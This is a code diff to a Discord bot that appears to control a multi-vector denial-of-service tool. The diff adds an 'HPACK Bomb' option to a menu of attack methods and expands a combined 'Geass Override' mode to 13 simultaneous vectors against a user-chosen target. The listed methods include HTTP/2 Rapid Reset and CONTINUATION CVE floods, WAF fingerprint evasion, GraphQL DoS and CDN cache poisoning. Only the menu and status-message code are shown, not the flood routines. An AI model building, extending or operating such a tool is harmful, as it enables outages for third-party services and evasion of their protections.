@@ -39,11 +39,12 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞",           description: "MAX POWER — 10 vectors (DECA): H2RST+H2CONT+WAF+WS+GQL+QUIC+SSL+...", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞",           description: "MAX POWER — 13 vectors (ARES): H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+CACHE+TLS+QUIC+SSL...", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",         description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",        emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",          description: "CVE-2023-44487 — 64-stream RST burst, millions req/s",                emoji: "⚡" },
   { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)", description: "CVE-2024-27316 — endless CONTINUATION frames, server OOM",           emoji: "💀" },
+  { value: "hpack-bomb",          label: "🧨 HPACK Bomb (RFC 7541)",      description: "Incremental-indexed headers → HPACK table eviction storm — no CVE, no fix", emoji: "🧨" },
   { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",       description: "Holds thousands of WS conns open — goroutine/thread per conn",        emoji: "🕸️" },
   { value: "graphql-dos",         label: "🔮 GraphQL Introspection DoS",   description: "Nested queries O(N^15) + alias bombs + batched introspection",        emoji: "🔮" },
   { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",    description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",   emoji: "☠️" },
@@ -530,14 +531,14 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
         .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
         .setDescription(
           `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
-          `👁️ **GEASS OVERRIDE — DECA-VECTOR** — 10 simultaneous vectors against \`${target}\`\n` +
-          `**ConnFlood → Slowloris → H2 RST → H2 CONT → WAF Bypass → WS → GQL → UDP → QUIC → SSL Death**`
+          `👁️ **GEASS OVERRIDE — ARES OMNIVECT** — 13 simultaneous vectors against \`${target}\`\n` +
+          `**ConnFlood → Slowloris → H2RST → H2CONT → HPACK Bomb → WAF Bypass → WS → GQL → RUDY v2 → Cache Poison → TLS Renego → QUIC → SSL Death**`
         )
         .addFields(
           { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
           { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
           { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",   value: "🔴 **INITIALIZING 10 VECTORS...**", inline: false },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 13 VECTORS — ARES COMMAND...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
